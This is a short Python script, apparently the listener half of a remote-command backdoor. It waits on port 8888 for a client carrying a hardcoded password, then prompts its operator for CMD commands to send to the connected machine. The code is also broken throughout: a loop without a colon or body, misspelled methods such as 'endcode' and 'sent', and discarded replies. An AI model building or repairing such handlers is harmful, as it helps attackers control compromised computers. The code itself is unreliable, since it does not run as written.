import socket 

host = "0.0.0.0"
port = 8888

myserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
myserver.bind((host, port))
print("socket created successfuly")

myserver.listen(0)
print("[+] start to listen")

(client_socket, client_address) = myserver.accept()
print("[+] {} connected", client_address)

data = client_socket.recv(1024)
if data.decode() == "4timgj35piot":
    print("Authenticeted session")
    while(True)
    print(data.decode())
    command = input("please enter a CMD command: ")
    
    client_socket.send(command.endcode())
    print("command CMD")
    client_socket.recv(1024).decode()
else:
    client_socket.sent ("I got you")
    print("Unauthenticeted session")

myserver.close()
client_socket.close()
print("socket closed")